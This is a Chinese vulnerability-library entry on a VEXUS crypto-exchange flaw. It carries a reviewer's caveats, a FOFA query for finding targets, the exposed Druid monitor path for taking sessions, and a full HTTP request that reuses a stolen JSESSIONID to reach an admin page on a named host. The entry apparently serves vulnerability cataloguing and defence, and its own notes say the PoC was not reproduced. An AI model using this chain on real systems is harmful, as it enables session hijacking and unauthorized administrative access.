---
source: "wy876 漏洞文库"
title: "VEXUS多语言交易所 Druid暴露与会话访问链"
product: "VEXUS多语言交易所"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "版本未知；Druid监控开放配置"
prerequisites: "需获得可用JSESSIONID"
side_effects: "在线解密或外部服务可能收到凭据及敏感内容"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/nkwou5fss984m2t8"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/VEXUS%E4%BA%A4%E6%98%93%E6%89%80/VEXUS%E5%A4%9A%E8%AF%AD%E8%A8%80%E8%B4%A7%E5%B8%81%E4%BA%A4%E6%98%93%E6%89%80%E5%AD%98%E5%9C%A8%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E.md"
fofa_unverified: "image/n2.png"
id: "vw-8e9336f2e6636b5178d4d8ec"
entity_id: "ve-8e9336f2e6636b5178d4d8ec"
schema_version: "1"
---

# VEXUS多语言交易所 Druid暴露与会话访问链

## 条目说明

- 对象与具体问题：VEXUS多语言交易所；Druid暴露与会话访问链
- 版本、配置及部署条件：版本未知；Druid监控开放配置
- 认证与权限前提：需获得可用JSESSIONID
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- druid/index.html存在不证明泄露有效会话，需具体监控数据及访问权限证据
- 只有username=admin访问请求，爆破措辞无枚举对象/响应判定说明
- 会话劫持与认证绕过不同阶段
- 缺CVE/修复，不能将所有Druid或VEXUS部署认作受影响

## 操作风险

在线解密或外部服务可能收到凭据及敏感内容。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 一、漏洞简介
VEXUS多语言货币交易所存在未授权访问漏洞

## 二、影响版本
+ VEXUS多语言货币交易所

## 三、资产测绘
+ fofa`"image/n2.png" && "public/login.action"`
+ 特征


## 四、漏洞复现
```java
/druid/index.html
```


获取session后可通过下面poc进行爆破

```http
GET /normal/LoginSuccessAction!view.action?username=admin HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
Cache-Control: no-cache
Connection: keep-alive
Cookie: JSESSIONID=可用的SESSION
Host: admin.kftust.com
Pragma: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/nkwou5fss984m2t8>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
